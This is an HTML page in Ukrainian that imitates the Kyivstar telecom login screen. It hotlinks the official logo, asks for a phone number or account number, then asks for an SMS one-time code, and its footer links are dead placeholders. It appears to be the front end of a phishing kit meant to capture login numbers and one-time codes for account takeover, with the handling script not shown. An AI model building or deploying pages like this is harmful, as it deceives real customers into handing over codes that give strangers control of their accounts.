<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Вхід — Київстар</title>
  <link rel="stylesheet" href="../css/form-style.css" />
</head>
<body>

<div class="container">

  <header class="header">
    <div class="logo">
      <img src="https://www.kyivstar.ua/img/kyivstar-logo-blue.svg" alt="Київстар">
    </div>
    <select id="langSelect">
      <option value="uk">УКР</option>
      <option value="en">ENG</option>
    </select>
  </header>

  <div class="card">

    <!-- Крок 1: Номер телефону -->
    <div id="step1">
      <h1>Вхід</h1>
      <p class="subtitle">Введіть номер телефону або рахунок Домашнього Інтернету</p>

      <input type="text" id="phoneInput" placeholder="Номер телефону або особовий рахунок" maxlength="19" autocomplete="off">

      <button id="nextBtn" disabled>Далі</button>
    </div>

    <!-- Крок 2: SMS-код -->
    <div id="step2" class="hidden">
      <h1>Вхід</h1>
      <p class="subtitle">Вхід за номером <span id="displayPhone"></span></p>

      <div class="phone-display">
        SMS-код надіслано на номер <span id="maskedPhone"></span><br>
        Термін дії коду — 3 хв.
      </div>

      <input type="text" id="smsInput" placeholder="Код із SMS" maxlength="6" autocomplete="off">

      <label class="checkbox-label">
        <input type="checkbox" id="rememberMe">
        <span>Запам'ятати мене</span>
      </label>

      <button id="loginBtn" disabled>Далі</button>

      <div class="resend" id="resendTimer">Надіслати код повторно через 0:55</div>
    </div>

  </div>

</div>

<footer class="footer">
  <div class="links">
    <a href="#">Про нас</a>
    <a href="#">Конфіденційність</a>
    <a href="#">Підтримка</a>
  </div>
  <p>© 1997–2025 ПрАТ «Київстар». Усі права захищено.</p>
</footer>

<script src="../js/js-form.js.js"></script>
</body>
</html>
